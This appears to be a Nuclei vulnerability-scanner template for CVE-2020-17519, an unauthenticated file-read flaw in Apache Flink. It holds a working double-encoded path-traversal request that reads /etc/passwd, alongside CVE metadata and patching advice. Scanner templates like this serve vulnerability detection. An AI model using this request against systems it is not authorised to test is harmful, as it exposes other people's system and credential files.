http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'
id: CVE-2020-17519
info:
  author: pdteam
  classification:
    cpe: cpe:2.3:a:apache:flink:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-17519
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-552
    epss-percentile: 0.99967
    epss-score: 0.94383
  description: Apache Flink 1.11.0 (and released in 1.11.1 and 1.11.2 as well) allows
    attackers to read any file on the local filesystem of the JobManager through the
    REST interface of the JobManager process (aka local file inclusion).
  impact: 'Unauthenticated attackers can read arbitrary files from the JobManager
    local filesystem, potentially exposing sensitive configuration files, credentials,
    and proprietary data.

    '
  metadata:
    max-request: 1
    product: flink
    vendor: apache
  name: Apache Flink - Local File Inclusion
  reference:
  - https://github.com/B1anda0/CVE-2020-17519
  - https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d%40%3Cdev.flink.apache.org%3E
  - https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d@%3Cdev.flink.apache.org%3E
  - https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d@%3Cuser.flink.apache.org%3E
  - https://nvd.nist.gov/vuln/detail/CVE-2020-17519
  remediation: 'Apply the latest security patches or upgrade to a patched version
    of Apache Flink to mitigate the vulnerability.

    '
  severity: high
  tags: cve,cve2020,apache,lfi,flink,kev,vkev,vuln
